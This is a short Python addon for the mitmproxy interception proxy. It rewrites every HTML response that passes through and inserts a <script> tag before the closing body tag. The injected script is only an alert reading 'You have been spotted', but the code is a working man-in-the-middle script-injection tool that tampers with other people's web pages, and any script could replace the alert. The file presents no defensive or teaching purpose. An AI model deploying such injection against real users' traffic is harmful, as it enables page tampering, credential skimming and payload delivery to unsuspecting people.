from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "text/html" in flow.response.headers.get("content-type",""):
        data = flow.response.get_text()
        injection = "<script>alert('You have been spotted 😈');</script>"
        flow.response.set_text(data.replace("</body>", injection + "</body>"))
